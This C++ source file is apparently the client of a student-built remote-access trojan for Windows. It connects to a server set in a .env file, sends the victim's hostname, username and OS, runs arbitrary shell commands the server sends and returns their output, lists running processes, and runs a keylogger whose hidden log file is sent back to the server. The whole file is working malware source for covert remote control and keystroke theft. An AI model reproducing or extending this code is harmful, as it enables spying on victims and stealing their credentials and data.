#include "ClientApp.hpp"
#include <windows.h>
#include <psapi.h>
#include <iostream>
#include <chrono>
#include <thread>
#include "../utils/EnvLoader.hpp"
#include "../utils/LPTF/LPTF_PacketType.hpp"
#include "../utils/LPTF/LPTF_Packet.hpp"
#include "../utils/SystemInfo/SystemInfo.hpp"
#include "../utils/SystemInfo/TaskList.hpp"
#include "../utils/CommandSystem/BashExec.hpp"

/**
 * @brief Constructs the ClientApp object and initializes the running flag.
 */
ClientApp::ClientApp()
    : running(true)
{
}

/**
 * @brief Destructor for ClientApp. Stops threads and closes the socket.
 */
ClientApp::~ClientApp()
{
    running = false;
    if (serverThread.joinable())
        serverThread.join();
    if (keylogThread.joinable())
        keylogThread.join();
    if (socket)
        socket->closeSocket();
}

/**
 * @brief Main entry point for the client application. Initializes, connects, and enters the main loop.
 */
void ClientApp::run()
{
    setupConsole();
    KeyLogger::hideFile("key_file.txt");

    LPTF_Socket::initialize();
    socket = std::make_unique<LPTF_Socket>();

    loadAndConnectEnv();
    sendSystemInfo();

    listProcesses();

    launchServerThread();

    // Main event loop
    while (running)
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
}

// --------------- Helpers for run() ---------------

/**
 * @brief Sets up the console for UTF-8 output and input.
 */
void ClientApp::setupConsole()
{
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    // SetFileAttributesA(exePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
}

/**
 * @brief Loads environment variables and connects the socket to the server.
 */
void ClientApp::loadAndConnectEnv()
{
    auto env = EnvLoader::loadEnv("../../.env");
    std::string ip = EnvLoader::loadIP("../../.env");
    int port = EnvLoader::loadPort("../../.env");
    socket->connectSocket(ip, port);
    std::cout << "Connecté au serveur " << ip << ":" << port << std::endl;
}

/**
 * @brief Sends system information to the server after printing it locally.
 */
void ClientApp::sendSystemInfo()
{
    std::cout << "Envoi automatique des informations système...\n";
    auto sysInfo = SystemInfo::getSystemInfo();
    std::string jsonInfo = SystemInfo::toJson(sysInfo);
    printSystemInfo(sysInfo);
    std::vector<uint8_t> payload(jsonInfo.begin(), jsonInfo.end());
    LPTF_Packet sysInfoPacket(1, PacketType::GET_INFO, 0, 1, 1, payload);
    socket->sendBinary(sysInfoPacket.serialize());
    std::cout << "Informations système envoyées au serveur.\n";
}

/**
 * @brief Prints system information to the console.
 * @param sysInfo Map containing system information fields and values.
 */
void ClientApp::printSystemInfo(const std::map<std::string, std::string> &sysInfo)
{
    std::cout << "Informations système:" << std::endl;
    std::cout << "- Nom d'hôte: " << sysInfo.at("hostname") << std::endl;
    std::cout << "- Utilisateur: " << sysInfo.at("username") << std::endl;
    std::cout << "- Système: " << sysInfo.at("operating_system") << std::endl;
}

/**
 * @brief Lists running processes using ProcessLister (result unused).
 */
void ClientApp::listProcesses()
{
    ProcessLister processLister;
    std::vector<std::string> exeList = processLister.getExeList();
}

/**
 * @brief Launches the server request handler thread.
 */
void ClientApp::launchServerThread()
{
    serverThread = std::thread(&ClientApp::serverRequestHandler, this);
}

// --------------------------------------------

/**
 * @brief Handles incoming server requests in a loop until stopped.
 */
void ClientApp::serverRequestHandler()
{
    while (running)
    {
        try
        {
            std::vector<uint8_t> data = socket->recvBinary();
            LPTF_Packet packet = LPTF_Packet::deserialize(data);
            handlePacket(packet);
        }
        catch (const std::exception &e)
        {
            handleServerException(e);
            break;
        }
    }
}

/**
 * @brief Dispatches the received packet to the appropriate handler based on its type.
 * @param packet The received LPTF_Packet from the server.
 */
void ClientApp::handlePacket(const LPTF_Packet &packet)
{
    switch (packet.getType())
    {
    case PacketType::GET_INFO:
        handleGetInfoPacket(packet);
        break;
    case PacketType::RESPONSE:
        // Ignore or handle response
        break;
    case PacketType::KEYLOG:
        handleKeylogPacket(packet);
        break;
    case PacketType::EXEC_COMMAND:
        handleExecCommandPacket(packet);
        break;
    case PacketType::PROCESS_LIST:
        handleProcessListPacket(packet);
        break;
    default:
        std::cout << "\n[SERVEUR] Type de paquet inconnu: "
                  << static_cast<int>(packet.getType()) << std::endl;
        std::cout << "Entrez le message : ";
        std::cout.flush();
    }
}

/**
 * @brief Handles exceptions thrown during server communication.
 * @param e The exception caught.
 */
void ClientApp::handleServerException(const std::exception &e)
{
    if (running)
    {
        std::cout << "\n[ERREUR] Connexion fermée: " << e.what() << std::endl;
        running = false;
    }
}

// --------------- Individual packet handlers ---------------

/**
 * @brief Handles a GET_INFO packet by sending system info back to the server.
 * @param packet The received GET_INFO packet (unused).
 */
void ClientApp::handleGetInfoPacket(const LPTF_Packet &)
{
    std::cout << "\n[CLIENT DEBUG] Received GET_INFO packet from server.\n";
    auto sysInfo = SystemInfo::getSystemInfo();
    for (const auto &pair : sysInfo)
        std::cout << "[CLIENT DEBUG]   " << pair.first << ": " << pair.second << std::endl;
    std::string jsonInfo = SystemInfo::toJson(sysInfo);
    std::vector<uint8_t> payload(jsonInfo.begin(), jsonInfo.end());
    LPTF_Packet response(1, PacketType::RESPONSE, 0, 1, 1, payload);
    std::cout << "[CLIENT DEBUG] Sending RESPONSE packet with system info to server.\n";
    socket->sendBinary(response.serialize());
    std::cout << "[CLIENT DEBUG] RESPONSE packet sent.\n";
}

/**
 * @brief Handles a KEYLOG packet by starting or stopping the keylogger.
 * @param packet The received KEYLOG packet.
 */
void ClientApp::handleKeylogPacket(const LPTF_Packet &packet)
{
    std::string cmd(packet.getPayload().begin(), packet.getPayload().end());
    if (cmd == "start")
        startKeylogger();
    else if (cmd == "stop")
        stopKeylogger(packet);
}

/**
 * @brief Handles an EXEC_COMMAND packet by executing the command and saving output to file.
 * @param packet The received EXEC_COMMAND packet.
 */
void ClientApp::handleExecCommandPacket(const LPTF_Packet &packet)
{
    std::cout << "[CLIENT DEBUG] Received EXEC_COMMAND packet from server.\n";
    std::string cmd(packet.getPayload().begin(), packet.getPayload().end());
    std::cout << "[CLIENT DEBUG] Executing command: " << cmd << std::endl;

    // Execute the command and write the output to exec_output.txt
    if (!BashExec::executeToFile(cmd, "exec_output.txt"))
    {
        std::cerr << "[CLIENT ERROR] Failed to execute command: " << cmd << std::endl;
        std::string err = "Échec de l'exécution de la commande: " + cmd;
        std::vector<uint8_t> errPayload(err.begin(), err.end());
        LPTF_Packet errorPacket(1, PacketType::RESPONSE, 0,
                                packet.getPacketId(), packet.getSessionId(), errPayload);
        socket->sendBinary(errorPacket.serialize());
        return;
    }

    // Read the output file
    std::ifstream in("exec_output.txt", std::ios::binary);
    std::string output;
    if (in)
    {
        output.assign((std::istreambuf_iterator<char>(in)),
                      std::istreambuf_iterator<char>());
        in.close();
    }
    else
    {
        output = "Impossible de lire exec_output.txt";
    }

    // Send the result to the server
    std::vector<uint8_t> payload(output.begin(), output.end());
    LPTF_Packet responsePacket(1, PacketType::RESPONSE, 0,
                               packet.getPacketId(), packet.getSessionId(), payload);
    socket->sendBinary(responsePacket.serialize());
    std::cout << "[CLIENT DEBUG] RESPONSE (exec output) packet sent.\n";
}

/**
 * @brief Handles a PROCESS_LIST packet by sending the process list to the server.
 * @param packet The received PROCESS_LIST packet.
 */
void ClientApp::handleProcessListPacket(const LPTF_Packet &packet)
{
    bool namesOnly = (packet.getFlags() & 1) != 0;
    std::string resp = getProcessListString(namesOnly);
    std::vector<uint8_t> payload(resp.begin(), resp.end());
    LPTF_Packet reply(1, PacketType::PROCESS_LIST, 0,
                      packet.getPacketId(), packet.getSessionId(), payload);
    socket->sendBinary(reply.serialize());
}

/**
 * @brief Gets a string listing all running processes.
 * @param namesOnly If true, only process names are included; otherwise, PID and name.
 * @return std::string The formatted process list.
 */
std::string ClientApp::getProcessListString(bool namesOnly)
{
    std::string resp;
    DWORD pids[1024], cbNeeded;
    if (EnumProcesses(pids, sizeof(pids), &cbNeeded))
    {
        size_t count = cbNeeded / sizeof(DWORD);
        for (size_t i = 0; i < count; ++i)
        {
            DWORD pid = pids[i];
            if (pid == 0)
                continue;
            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
            if (!hProc)
                continue;
            CHAR nameBuf[MAX_PATH] = {0};
            HMODULE hMod;
            DWORD cbMod;
            if (EnumProcessModules(hProc, &hMod, sizeof(hMod), &cbMod))
                GetModuleBaseNameA(hProc, hMod, nameBuf, sizeof(nameBuf));
            CloseHandle(hProc);
            std::string name(nameBuf);
            resp += namesOnly ? (name + "\n") : (std::to_string(pid) + "  " + name + "\n");
        }
    }
    return resp;
}

//--------------- Keylogger control methods ---------------

/**
 * @brief Starts the keylogger if not already running.
 * Initializes the KeyLogger and starts its thread.
 */
void ClientApp::startKeylogger()
{
    if (!keyLogger)
    {
        keyLogger = std::make_unique<KeyLogger>("key_file.txt");
        KeyLogger::hideFile("key_file.txt");
        if (keylogThread.joinable())
            keylogThread.join();
        keylogThread = std::thread([this]()
                                   { keyLogger->start(); });
        // Thread will be joined in destructor or when stopping keylogger
    }
}

/**
 * @brief Stops the keylogger and sends the logged data back to the server.
 * @param packet The received KEYLOG packet containing the request to stop logging.
 */
void ClientApp::stopKeylogger(const LPTF_Packet &packet)
{
    if (keyLogger)
    {
        keyLogger->stop();
        if (keylogThread.joinable())
            keylogThread.join();
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
        std::string loggedData = keyLogger->getLoggedData();
        std::vector<uint8_t> responsePayload(loggedData.begin(), loggedData.end());
        LPTF_Packet logResponse(1, PacketType::RESPONSE, 0,
                                packet.getPacketId(), packet.getSessionId(), responsePayload);
        socket->sendBinary(logResponse.serialize());
        keyLogger->clearLogFile();
        KeyLogger::unhideFile("key_file.txt");
        keyLogger.reset();
    }
}
